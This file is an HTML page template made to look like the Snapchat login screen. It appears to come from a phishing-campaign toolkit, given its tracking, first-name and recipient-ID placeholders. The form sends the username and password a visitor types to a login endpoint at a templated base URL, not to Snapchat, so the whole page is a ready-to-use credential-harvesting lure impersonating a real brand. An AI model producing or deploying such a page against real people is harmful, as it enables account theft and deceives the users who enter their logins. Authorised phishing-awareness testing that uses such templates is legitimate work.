<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Log In</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
            background-color: #fffc00;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 35px;
            border-radius: 12px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .logo {
            font-size: 45px;
            color: #333;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 22px;
            color: #333;
            margin-bottom: 10px;
        }
        .subheader {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
        }
        .personalized {
            font-size: 15px;
            color: #333;
            margin-bottom: 15px;
        }
        .input-field {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 20px;
            box-sizing: border-box;
            font-size: 15px;
            background-color: #fafafa;
        }
        .login-btn {
            background-color: #00d2ff;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 20px;
            width: 100%;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #00b7e6;
        }
        .forgot-password {
            display: block;
            margin-top: 12px;
            color: #0095f6;
            text-decoration: none;
            font-size: 13px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .signup {
            margin-top: 15px;
            font-size: 13px;
            color: #333;
        }
        .signup a {
            color: #0095f6;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    {{.Tracking}}
    <div class="container">
        <div class="logo">👻</div>
        <h1>Log In to Snapchat</h1>
        <div class="subheader">Log in to continue</div>
        <div class="personalized">Welcome back, {{.FirstName}}!</div>
        <form action="{{.BaseURL}}/login" method="post">
            <input type="hidden" name="rid" value="{{.RID}}">
            <input type="text" class="input-field" name="username" placeholder="Username or Email" required>
            <input type="password" class="input-field" name="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgot Password?</a>
        <div class="signup">
            New to Snapchat? <a href="#">Sign Up</a>
        </div>
    </div>
</body>
</html>
